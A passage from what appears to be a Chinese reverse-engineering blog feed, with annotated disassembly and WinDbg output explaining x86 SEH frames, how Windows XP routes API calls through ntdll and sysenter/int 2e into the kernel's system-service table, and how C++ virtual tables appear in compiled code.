class="number">00401155</span></span><br><span class="line">.text:<span class="number">0040115B</span> add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0040115</span>E mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFFh</span><br><span class="line">.text:<span class="number">0040115</span>E</span><br><span class="line">.text:<span class="number">00401165</span></span><br><span class="line">.text:<span class="number">00401165</span> loc_401165:                             ; CODE XREF: _main+C7↑j</span><br><span class="line">.text:<span class="number">00401165</span> push    offset aMainEnd                 ; <span class="string">&quot;main end&quot;</span></span><br><span class="line">.text:<span class="number">0040116</span>A call    ds:__imp__puts</span><br><span class="line">.text:<span class="number">0040116</span>A</span><br><span class="line">.text:<span class="number">00401170</span> add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401173</span> jmp     <span class="type">short</span> loc_401177</span><br><span class="line">.text:<span class="number">00401173</span></span><br><span class="line">.text:<span class="number">00401175</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00401175</span> jmp     <span class="type">short</span> loc_401179</span><br><span class="line">.text:<span class="number">00401175</span></span><br><span class="line">.text:<span class="number">00401177</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00401177</span></span><br><span class="line">.text:<span class="number">00401177</span> loc_401177:                             ; CODE XREF: _main+<span class="number">103</span>↑j</span><br><span class="line">.text:<span class="number">00401177</span> xor     eax, eax</span><br><span class="line">.text:<span class="number">00401177</span></span><br><span class="line">.text:<span class="number">00401179</span></span><br><span class="line">.text:<span class="number">00401179</span> loc_401179:                             ; CODE XREF: _main+<span class="number">105</span>↑j</span><br><span class="line">.text:<span class="number">00401179</span> mov     ecx, [ebp+ms_exc.registration.Next]</span><br><span class="line">.text:<span class="number">0040117</span>C mov     large fs:<span class="number">0</span>, ecx                   ;卸载seh</span><br><span class="line">.text:<span class="number">00401183</span> pop     edi</span><br><span class="line">.text:<span class="number">00401184</span> pop     esi</span><br><span class="line">.text:<span class="number">00401185</span> pop     ebx</span><br><span class="line">.text:<span class="number">00401186</span> mov     esp, ebp</span><br><span class="line">.text:<span class="number">00401188</span> pop     ebp</span><br><span class="line">.text:<span class="number">00401189</span> retn</span><br><span class="line">.text:<span class="number">00401189</span> ; &#125; <span class="comment">// starts at 401070</span></span><br><span class="line">.text:<span class="number">00401189</span></span><br><span class="line">.text:<span class="number">00401189</span> _main endp</span><br></pre></td></tr></table></figure><p>main函数里栈帧如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$<span class="number">-24</span>     saved_edi &lt;--esp</span><br><span class="line">$<span class="number">-20</span>     saved_esi    ^</span><br><span class="line">$<span class="number">-1</span>C     saved_ebx    |</span><br><span class="line">$<span class="number">-18</span>     当前函数栈帧ESP---&gt;</span><br><span class="line">$<span class="number">-14</span>     PEXCEPTION_POINTERS 是GetExceptionInformation等函数返回位置,异常发送时才会赋值</span><br><span class="line">$<span class="number">-10</span>     _EXCEPTION_REGISTRATION.prev &lt;--fs:<span class="number">0</span> 指向前一个EXCEPTION_REGISTRATION结构</span><br><span class="line">$-C      __except_handler3</span><br><span class="line">$<span class="number">-8</span>      _EXCEPTION_REGISTRATION.scopetable</span><br><span class="line">$<span class="number">-4</span>        _EXCEPTION_REGISTRATION.trylevel 初始<span class="number">0xfffffffff</span></span><br><span class="line">ebp==&gt;    prev_ebp</span><br><span class="line">          main_ret</span><br></pre></td></tr></table></figure><p>scopetable_entry结构体数组情况</p><p><img src="/2023/11/02/SEH-x86/image-20231103225048130.png" alt="image-20231103225048130"></p><p>__except_handler3的细节暂时不分析了</p><p><img src="/2023/11/02/SEH-x86/image-20231103122031592.png" alt="image-20231103122031592"></p><p>从程序加载的dll找到</p><p><img src="/2023/11/02/SEH-x86/image-20231103122110609.png" alt="image-20231103122110609"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核:API调用--&gt;系统调用</title>
      <link href="/2023/11/01/Windows-Kernel-X86-api/"/>
      <url>/2023/11/01/Windows-Kernel-X86-api/</url>
      
        <content type="html"><![CDATA[<p>算是对之前实验的补充,依旧是xp系统</p><h2 id="几个重要dll"><a href="#几个重要dll" class="headerlink" title="几个重要dll"></a>几个重要dll</h2><p>kernel32.dll:管理内存，进程和线程相关函数</p><p>User32.dll:用户界面相关应用程序接口，创建窗口和发送消息等</p><p>GDI32.dll:画图，显示文本相关函数</p><p>Ntdll.dll:三环进零环相关</p><h2 id="ReadProcessMemory"><a href="#ReadProcessMemory" class="headerlink" title="ReadProcessMemory"></a>ReadProcessMemory</h2><p>kernel32.dll里的ReadProcessMemory为例</p><p>调用了ntdll里的导出函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C8021E5 FF <span class="number">15</span> <span class="number">18</span> <span class="number">14</span> <span class="number">80</span> <span class="number">7</span>C             call    ds:__imp__NtReadVirtualMemory@<span class="number">20</span> ; NtReadVirtualMemory(x,x,x,x,x)</span><br></pre></td></tr></table></figure><p>ntdll里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C92D9E0 B8 BA <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0B</span>Ah                       ;BA编号对应内核函数NtReadVirtualMemory</span><br><span class="line">.text:<span class="number">7</span>C92D9E5 BA <span class="number">00</span> <span class="number">03</span> FE <span class="number">7F</span>                mov     edx, <span class="number">7F</span>FE0300h</span><br><span class="line">.text:<span class="number">7</span>C92D9EA FF <span class="number">12</span>                         call    dword ptr [edx]</span><br><span class="line">.text:<span class="number">7</span>C92D9EC C2 <span class="number">14</span> <span class="number">00</span>                      retn    <span class="number">14</span>h</span><br></pre></td></tr></table></figure><h2 id="7FFE0300h是啥"><a href="#7FFE0300h是啥" class="headerlink" title="7FFE0300h是啥"></a>7FFE0300h是啥</h2><p>_KUSER_SHARED_DATA结构体:用户态的地址<code>0x7FFE0000</code>内核态的地址<code>0xffdf0000</code>共享一张物理页，用户态是只读的，内核态是可写的</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KUSER_SHARED_DATA  0x7FFE0000</span><br><span class="line">...</span><br><span class="line">+0x300 SystemCall       : 0x7c92e4f0</span><br></pre></td></tr></table></figure><p>7FFE0300h处存在两种情况:KiFastSystemCall或者KiIntSystemCall(都是ntdll导出函数)</p><p>eax置0，执行<a href="https://zh.wikipedia.org/zh-hans/CPUID">cpuid</a>指令会把处理器特征存在ecx edx，edx 第11为SEP为1则支持快速调用sysenter&#x2F;sysexit指令为KiFastSystemCall</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x7c92e4f0</span></span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp<span class="comment">//KiFastSystemCall</span></span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br></pre></td></tr></table></figure><p>否则为KiIntSystemCall</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C92E500                               ; _DWORD __stdcall <span class="title function_">KiIntSystemCall</span><span class="params">()</span></span><br><span class="line">.text:7C92E500                               public _KiIntSystemCall@0</span><br><span class="line">.text:7C92E500                               _KiIntSystemCall@0 proc near            ; DATA XREF: .text:off_7C923428↑o</span><br><span class="line">.text:<span class="number">7</span>C92E500</span><br><span class="line">.text:<span class="number">7</span>C92E500                               arg_4= byte ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">7</span>C92E500</span><br><span class="line">.text:<span class="number">7</span>C92E500 <span class="number">8</span>D <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>                   lea     edx, [esp+arg_4]                ;<span class="number">32</span>位用栈传参嘛，所以这里是系统调用参数地址</span><br><span class="line">.text:<span class="number">7</span>C92E504 CD <span class="number">2</span>E                         <span class="type">int</span>     <span class="number">2</span>Eh                             ; DOS <span class="number">2</span>+ internal - EXECUTE COMMAND</span><br><span class="line">.text:<span class="number">7</span>C92E504                                                                       ; DS:SI -&gt; counted CR-terminated command <span class="built_in">string</span></span><br><span class="line">.text:<span class="number">7</span>C92E504</span><br><span class="line">.text:<span class="number">7</span>C92E506 C3                            retn</span><br></pre></td></tr></table></figure><h2 id="int-0x2e和sysenter区别联系"><a href="#int-0x2e和sysenter区别联系" class="headerlink" title="int 0x2e和sysenter区别联系"></a>int 0x2e和sysenter区别联系</h2><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a><strong>相同点</strong></h3><p>从3环到0环都需要改变cs ss esp eip</p><h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a><strong>不同点</strong></h3><h4 id="int-2e"><a href="#int-2e" class="headerlink" title="int 2e"></a>int 2e</h4><p>通过idtr寄存器，找到中断门描述符得到CS，EIP，再通过TR寄存器找到TSS取出ss和esp</p><p><img src="/2023/11/01/Windows-Kernel-X86-api/image-20231103230557854.png" alt="image-20231103230557854"></p><p>到0环执行内核函数KiSystemService</p><h4 id="sysenter"><a href="#sysenter" class="headerlink" title="sysenter"></a>sysenter</h4><p>通过MSR寄存器找到CS，EIP，SS，ESP(其中SS是用CS+8算出来的)，加载到寄存器是cpu自动完成的，和操作系统没关系，操作系统负责用rdmsr和wrmst来给msr寄存器赋正确值</p><p><img src="/2023/11/01/Windows-Kernel-X86-api/image-20231103230613180.png" alt="image-20231103230613180"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; rdmsr <span class="number">174</span>   <span class="comment">//查看CS</span></span><br></pre></td></tr></table></figure><p>到0环执行内核函数KiFastCallEntry</p><h2 id="KiSystemService"><a href="#KiSystemService" class="headerlink" title="KiSystemService"></a>KiSystemService</h2><p>内核函数KiSystemService和KiFastCallEntry都在c:windows&#x2F;system32下，非pae分页用的是ntoskrnl.exe，pae分页是ntkrnlpa.exe</p><h3 id="保存现场"><a href="#保存现场" class="headerlink" title="保存现场"></a>保存现场</h3><p>涉及到一些结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dt _Ktrap_frame 保存寄存器的结构体</span><br><span class="line">dt _KPCR：KPCR中存储了CPU本身要用的一些重要数据：GDT、IDT以及线程相关的一些信息，一个cpu核一个</span><br><span class="line">dd KeNumberProcessors 查看cpu核数</span><br><span class="line">dd KiProcessorBlock 查看每个cpu的kpcr结构体中偏移<span class="number">0x120</span>处的_KPRCB结构体的位置</span><br><span class="line">dt _ETHREAD 线程相关结构体 </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00466489</span> BB <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     ebx, <span class="number">30</span>h ; <span class="string">&#x27;0&#x27;</span></span><br><span class="line">.text:<span class="number">0046648</span>E <span class="number">66</span> <span class="number">8</span>E E3                      mov     fs, bx</span><br></pre></td></tr></table></figure><p>0x30按照段描述符拆分一下 00110 0 00，0环全局描述符表的第6个 </p><p><img src="/2023/11/01/Windows-Kernel-X86-api/image-20231103230641570.png" alt="image-20231103230641570"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kd&gt; dq @gdtr+8*6 l1</span><br><span class="line">8003f030  ffc093df`f0000001</span><br></pre></td></tr></table></figure><p>再拆分一下段描述符<code>ffc093df f0000001</code>得到基址<code>ffdf f000</code></p><p>ffdf f000指向的就是kpcr结构体，</p><blockquote><p>fs在三环时指向TEB结构体</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00466481 arg_0= dword ptr  4</span><br><span class="line">.text:00466481</span><br><span class="line">.text:00466481 push    0                              ;push errcode,在此之前中断时cpu已经自动帮我们把ss esp eflags cs ip压栈</span><br><span class="line">.text:00466483 push    ebp</span><br><span class="line">.text:00466484 push    ebx</span><br><span class="line">.text:00466485 push    esi</span><br><span class="line">.text:00466486 push    edi</span><br><span class="line">.text:00466487 push    fs                              ; 保存到_ktrap_frame对应位置</span><br><span class="line">.text:00466489 mov     ebx, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:0046648E mov     fs, bx</span><br><span class="line">.text:00466491 assume fs:nothing</span><br><span class="line">.text:00466491 push    dword ptr ds:0FFDFF000h         ; 保存kpcr结构体第一项_EXCEPTION_REGISTRATION_RECORD异常链表到ktrap_frame结构体</span><br><span class="line">.text:00466497 mov     dword ptr ds:0FFDFF000h, 0FFFFFFFFh ; 把第一项_EXCEPTION_REGISTRATION_RECORD异常链表置零</span><br><span class="line">.text:004664A1 mov     esi, ds:0FFDFF124h              ; KPCR结构体里KPCRB+4的位置是当前CPU所执行线程的_ETHREAD结构体</span><br><span class="line">.text:004664A7 push    dword ptr [esi+140h]            ; 保存_ETHREAD第一个成员_KTHREAD+0x140处为PreviousMode先前模式到fram结构体，1代表先前模式为3环，0代表0环</span><br><span class="line">.text:004664AD sub     esp, 48h                        ; esp指向_kTrap_Frame的起始位置</span><br><span class="line">.text:004664B0 mov     ebx, [esp+68h+arg_0]            ; _Ktrap_frame--&gt;SegCs</span><br><span class="line">.text:004664B4 and     ebx, 1</span><br><span class="line">.text:004664B7 mov     [esi+140h], bl                  ; _KTHREAD的PreviousMode赋值为cs寄存器特权级，1代表3环来的，0代表0环来的</span><br><span class="line">.text:004664BD mov     ebp, esp                        ; ebp=_kTrap_Frame首地址</span><br><span class="line">.text:004664BF mov     ebx, [esi+134h]                 ; ebx=KTHREAD--&gt;TrapFrame</span><br><span class="line">.text:004664C5 mov     [ebp+3Ch], ebx</span><br><span class="line">.text:004664C8 mov     [esi+134h], ebp                 ; 老的TrapFrame的值新TrapFram--&gt;Edx，然后将新的TrapFrame放到EHTREAD+134h的trapfram处</span><br><span class="line">.text:004664CE cld</span><br><span class="line">.text:004664CF mov     ebx, [ebp+60h]</span><br><span class="line">.text:004664D2 mov     edi, [ebp+68h]                  ; 原来三环的ebp放到ebx里，三环eip放到edi中</span><br><span class="line">.text:004664D5 mov     [ebp+0Ch], edx                  ; KiIntSystemCall中edx保存参数地址，存放到trapfram的DbgArgPointer</span><br><span class="line">.text:004664D8 mov     dword ptr [ebp+8], 0BADB0D00h</span><br><span class="line">.text:004664DF mov     [ebp+0], ebx                    ; 原来三环ebp放到trapfram的DbgEbp</span><br><span class="line">.text:004664E2 mov     [ebp+4], edi                    ; 原来三环eip放到trapfram的DbgEip</span><br><span class="line">.text:004664E5 test    byte ptr [esi+2Ch], 0FFh        ; _ETHREAD._KTHREAD.DebugActive</span><br><span class="line">.text:004664E9 jnz     Dr_kss_a                        ; 处于调试状态，值不等于0xff，则跳转，跳转位置主要是保存trapfram中的调试寄存器</span><br><span class="line">.text:004664E9</span><br><span class="line">.text:004664EF</span><br><span class="line">.text:004664EF loc_4664EF:                             ; CODE XREF: Dr_kss_a+10↑j</span><br><span class="line">.text:004664EF                                         ; Dr_kss_a+7C↑j</span><br><span class="line">.text:004664EF sti</span><br><span class="line">.text:004664F0 jmp     loc_4665CD                      ; jmp到_KiFastCallEntry函数里某个的位置，此时和KifastCallentry一样流程</span><br></pre></td></tr></table></figure><h3 id="调用内核函数"><a href="#调用内核函数" class="headerlink" title="调用内核函数"></a>调用内核函数</h3><p>_KPCR.PrcbData(_KPRCB).CurrentThread(_KTHREAD)+0x0e0 处为ServiceTable，有下面两个table</p><p><img src="/2023/11/01/Windows-Kernel-X86-api/image-20231103230718438.png" alt="image-20231103230718438"></p><p>ServiceTable指向的是函数地址数组，每个成员四个字节</p><p>Count表示调用次数</p><p>ServiceLimit表示这张表有几个函数；</p><p>ArgumentTable指向对应函数有<strong>几个字节</strong>的参数，每个成员一个字节</p><p>通过eax索引号找到相关函数</p><p><img src="/2023/11/01/Windows-Kernel-X86-api/image-20231103230739865.png" alt="image-20231103230739865"></p><p>分析一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004665CD loc_4665CD:                             ; CODE XREF: _KiBBTUnexpectedRange+18↑j</span><br><span class="line">.text:004665CD                                         ; _KiSystemService+6F↑j</span><br><span class="line">.text:004665CD mov     edi, eax                        ; edi=传入系统服务号</span><br><span class="line">.text:004665CF shr     edi, 8                          ; 右移8位</span><br><span class="line">.text:004665D2 and     edi, 30h                        ; 基本系统调用号都是小于0x1000</span><br><span class="line">.text:004665D2                                         ; 窗口界面操作调用号大于0x1000定义在win32k.sys</span><br><span class="line">.text:004665D2                                         ; 如果12位为1，与完后edi=0x10，否则就为0</span><br><span class="line">.text:004665D5 mov     ecx, edi</span><br><span class="line">.text:004665D7 add     edi, [esi+0E0h]                 ; KPCR.PrcbData(_KPRCB).CurrentThread(_KTHREAD)+0x0e0=ServiceTable</span><br><span class="line">.text:004665D7                                         ; 如果edi是0x10(ServiceTable大小0x10)正好寻址到win32k.sys的ServiceTabl</span><br><span class="line">.text:004665DD mov     ebx, eax</span><br><span class="line">.text:004665DF and     eax, 0FFFh                      ; 保留调用号低12位，作为函数地址表的下标</span><br><span class="line">.text:004665E4 cmp     eax, [edi+8]                    ; ServiceTable.count比较</span><br><span class="line">.text:004665E7 jnb     _KiBBTUnexpectedRange           ; 大于等于跳转</span><br><span class="line">.text:004665E7</span><br><span class="line">.text:004665ED cmp     ecx, 10h                        ; 判断是哪张服务表</span><br><span class="line">.text:004665F0 jnz     short loc_46660C                ; 上图绿色那张表跳转</span><br><span class="line">.text:004665F0</span><br><span class="line">.text:004665F2 mov     ecx, ds:0FFDFF018h</span><br><span class="line">.text:004665F8 xor     ebx, ebx</span><br><span class="line">.text:004665F8</span><br><span class="line">.text:004665FA</span><br><span class="line">.text:004665FA loc_4665FA:                             ; DATA XREF: _KiTrap0E+113↓o</span><br><span class="line">.text:004665FA or      ebx, [ecx+0F70h]</span><br><span class="line">.text:00466600 jz      short loc_46660C                ; _KPRCB -&gt; +0x518 KeSystemCalls++;</span><br><span class="line">.text:00466600</span><br><span class="line">.text:00466602 push    edx</span><br><span class="line">.text:00466603 push    eax</span><br><span class="line">.text:00466604 call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:00466604</span><br><span class="line">.text:0046660A pop     eax</span><br><span class="line">.text:0046660B pop     edx</span><br><span class="line">.text:0046660B</span><br><span class="line">.text:0046660C</span><br><span class="line">.text:0046660C loc_46660C:                             ; CODE XREF: _KiFastCallEntry+B0↑j</span><br><span class="line">.text:0046660C                                         ; _KiFastCallEntry+C0↑j</span><br><span class="line">.text:0046660C inc     dword ptr ds:0FFDFF638h         ; _KPRCB -&gt; +0x518 KeSystemCalls++;</span><br><span class="line">.text:00466612 mov     esi, edx                        ; edx=三环栈上参数地址</span><br><span class="line">.text:00466614 mov     ebx, [edi+0Ch]                  ; ebx=ServiceTabl.ParamTableBase</span><br><span class="line">.text:00466617 xor     ecx, ecx</span><br><span class="line">.text:00466619 mov     cl, [eax+ebx]                   ; cl=参数总字节数</span><br><span class="line">.text:0046661C mov     edi, [edi]                      ; edi=ServiceTable.函数数组</span><br><span class="line">.text:0046661E mov     ebx, [edi+eax*4]                ; ebx=目标函数</span><br><span class="line">.text:00466621 sub     esp, ecx                        ; 提升堆栈</span><br><span class="line">.text:00466623 shr     ecx, 2                          ; ecx/4=一次拷贝四个字节的拷贝次数</span><br><span class="line">.text:00466626 mov     edi, esp                        ; 拷贝目标地址</span><br><span class="line">.text:00466628 cmp     esi, ds:_MmUserProbeAddress     ; 和用户能访问的最大地址范围比较，判断是否越界</span><br><span class="line">.text:0046662E jnb     loc_4667DC</span><br><span class="line">.text:0046662E</span><br><span class="line">.text:00466634</span><br><span class="line">.text:00466634 loc_466634:                             ; CODE XREF: _KiFastCallEntry+2A0↓j</span><br><span class="line">.text:00466634                                         ; DATA XREF: _KiTrap0E+109↓o</span><br><span class="line">.text:00466634 rep movsd                               ; copy参数</span><br><span class="line">.text:00466636 call    ebx                             ; 调用</span><br><span class="line">.text:00466636</span><br><span class="line">.text:00466638</span><br><span class="line">.text:00466638 loc_466638:                             ; CODE XREF: _KiFastCallEntry+2AB↓j</span><br><span class="line">.text:00466638                                         ; DATA XREF: _KiTrap0E+129↓o</span><br><span class="line">.text:00466638                                         ; _KiTrap0E+149↓o</span><br><span class="line">.text:00466638 mov     esp, ebp</span><br><span class="line">.text:00466638</span><br><span class="line">.text:0046663A</span><br><span class="line">.text:0046663A loc_46663A:                             ; CODE XREF: _KiBBTUnexpectedRange+38↑j</span><br><span class="line">.text:0046663A                                         ; _KiBBTUnexpectedRange+43↑j</span><br><span class="line">.text:0046663A mov     ecx, ds:0FFDFF124h</span><br><span class="line">.text:00466640 mov     edx, [ebp+3Ch]</span><br><span class="line">.text:00466643 mov     [ecx+134h], edx</span><br><span class="line">.text:00466643</span><br><span class="line">.text:00466643 _KiFastCallEntry endp</span><br></pre></td></tr></table></figure><h3 id="系统服务描述符表"><a href="#系统服务描述符表" class="headerlink" title="系统服务描述符表"></a>系统服务描述符表</h3><p>System Services Descriptor Table(SSDT)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   ntoskrnl;  <span class="comment">// ntoskrnl.exe 的服务函数</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   win32k;    <span class="comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed1;</span><br><span class="line">    KSYSTEM_SERVICE_TABLE   notUsed2;</span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, * PKSERVICE_TABLE_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>KeServiceDescriptorTable是ntkrnlpa导出符号</p><p>只有系统服务ntkrnlpa.exe对应的SystemServiceTable</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">80553f</span>a0  <span class="number">80502b</span>8c <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">80503000</span></span><br><span class="line"><span class="number">80553f</span>b0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>d0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><p>win32k需要通过SSDT Shadow来访问到，这是一个未导出的结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd  KeServiceDescriptorTableShadow</span><br><span class="line"><span class="number">80553f</span>60  <span class="number">80502b</span>8c <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">80503000</span></span><br><span class="line"><span class="number">80553f</span>70  bf999b80 <span class="number">00000000</span> <span class="number">0000029b</span> bf99a890</span><br><span class="line"><span class="number">80553f</span>80  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">80553f</span>90  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">0000000</span></span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.braveenough.cn/2022/01/30/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/">https://www.braveenough.cn/2022/01/30/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++反汇编 0x01</title>
      <link href="/2023/10/26/Cpp-disassemble-1/"/>
      <url>/2023/10/26/Cpp-disassemble-1/</url>
      
        <content type="html"><![CDATA[<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>编译器会将该类中所有虚函数的首地址保存在一张地址表中，这张表被称为虚函数地址表，简称虚表。编译器还会在类的首部添加一个隐藏数据成员，称为虚表指针。保存着虚表的首地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  <span class="comment">//虚函数定义</span></span><br><span class="line">    <span class="keyword">return</span> age;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  <span class="comment">//虚函数定义</span></span><br><span class="line">    this-&gt;age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Person() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;~Person()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">private:</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person.setAge(<span class="number">20</span>);</span><br><span class="line">  Person* ptr=&amp;person;</span><br><span class="line">  ptr-&gt;setAge(<span class="number">22</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, person.getAge());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400016E0    ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:00000001400016E0    mov     [rsp+arg_8], rdx</span><br><span class="line">.text:00000001400016E5    mov     [rsp+arg_0], ecx</span><br><span class="line">.text:00000001400016E9    sub     rsp, 48h</span><br><span class="line">.text:00000001400016ED    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:00000001400016F2    call    j_??0Person@@QEAA@XZ            ; Person::Person(void)</span><br><span class="line">.text:00000001400016F2</span><br><span class="line">.text:00000001400016F7    nop</span><br><span class="line">.text:00000001400016F8    mov     edx, 14h                        ; age</span><br><span class="line">.text:00000001400016FD    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:0000000140001702    call    j_?setAge@Person@@UEAAXH@Z      ; Person::setAge(int)</span><br><span class="line">.text:0000000140001702</span><br><span class="line">.text:0000000140001707    lea     rax, [rsp+48h+var_18]</span><br><span class="line">.text:000000014000170C    mov     [rsp+48h+var_20], rax</span><br><span class="line">.text:0000000140001711    mov     rax, [rsp+48h+var_20]           ;rax为this</span><br><span class="line">.text:0000000140001716    mov     rax, [rax]                      ;rax为虚表指针</span><br><span class="line">.text:0000000140001719    mov     edx, 16h                        ;参数:setAge(22)</span><br><span class="line">.text:000000014000171E    mov     rcx, [rsp+48h+var_20]           ;this指针用来寻址age成员</span><br><span class="line">.text:0000000140001723    call    qword ptr [rax+8]               ;利用虚表调用setAge</span><br><span class="line">.text:0000000140001723</span><br><span class="line">.text:0000000140001726    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:000000014000172B    call    j_?getAge@Person@@UEAAHXZ       ; Person::getAge(void)</span><br><span class="line">.text:000000014000172B</span><br><span class="line">.text:0000000140001730    mov     edx, eax</span><br><span class="line">.text:0000000140001732    lea     rcx, aD                         ; &quot;%d\n&quot;</span><br><span class="line">.text:0000000140001739    call    j_printf</span><br><span class="line">.text:0000000140001739</span><br><span class="line">.text:000000014000173E    mov     [rsp+48h+var_28], 0</span><br><span class="line">.text:0000000140001746    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:000000014000174B    call    j_??1Person@@QEAA@XZ            ; Person::~Person(void)</span><br><span class="line">.text:000000014000174B</span><br><span class="line">.text:0000000140001750    mov     eax, [rsp+48h+var_28]</span><br><span class="line">.text:0000000140001754    add     rsp, 48h</span><br><span class="line">.text:0000000140001758    retn</span><br></pre></td></tr></table></figure><p>编译器自动添加构造函数,把类首部赋值为虚表指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.rdata:<span class="number">0000000140007</span>DE8 ??_7Person@@<span class="number">6B</span>@ dq offset j_?getAge@Person@@UEAAHXZ, offset j_?setAge@Person@@UEAAXH@Z, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000140001510</span>  ; <span class="type">void</span> __fastcall <span class="title function_">Person::Person</span><span class="params">(Person *this)</span></span><br><span class="line">.text:0000000140001510  ??0Person@@QEAA@XZ proc near            ; CODE XREF: Person::Person(<span class="type">void</span>)↑j</span><br><span class="line">.text:<span class="number">0000000140001510</span></span><br><span class="line">.text:<span class="number">0000000140001510</span>  arg_0= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000140001510</span></span><br><span class="line">.text:<span class="number">0000000140001510</span>  mov     [rsp+arg_0], rcx</span><br><span class="line">.text:<span class="number">0000000140001515</span>  mov     rax, [rsp+arg_0]</span><br><span class="line">.text:<span class="number">000000014000151</span>A  lea     rcx, ??_7Person@@<span class="number">6B</span>@            ; <span class="type">const</span> Person::`vftable<span class="number">&#x27;</span></span><br><span class="line">.text:<span class="number">0000000140001521</span>  mov     [rax], rcx</span><br><span class="line">.text:<span class="number">0000000140001524</span>  mov     rax, [rsp+arg_0]</span><br><span class="line">.text:<span class="number">0000000140001529</span>  